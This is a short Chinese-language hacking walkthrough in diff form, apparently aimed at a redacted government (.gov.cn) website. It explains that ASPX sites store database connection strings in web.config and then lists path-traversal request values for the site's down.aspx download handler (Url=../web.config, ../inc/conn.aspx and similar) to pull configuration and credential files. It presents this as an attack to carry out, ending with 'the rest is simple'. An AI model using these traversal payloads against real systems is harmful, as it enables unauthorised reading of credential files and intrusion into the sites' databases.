@@ -1,0 +1,14 @@
+aspx网站的架构一般跟asp的网站架构不同，asp的数据库连接字符串一般都是放在conn.asp里的，而aspx的一般放在web.config里，这是一点区别。
+
+
+打开看看,下载了其中以后文件构造如下:www.xxxxx.gov.cn/zlxz/down.aspx?Url=File\xxxxx.xls
+很明显，他是调用down.aspx 去下载目标文件的
+我们能不能利用down.aspx去下载conn 或者config这些储存网站重要信息的文件呢?
+
+我们来构造下www.xxxxx.gov.cn/zlxz/down.aspx?Url=../inc/config.aspx
+Url=../inc/conn.aspx
+Url=../conn.aspx
+Url=../inc/config.aspx
+Url=../web.config
+
+下面就很简单了
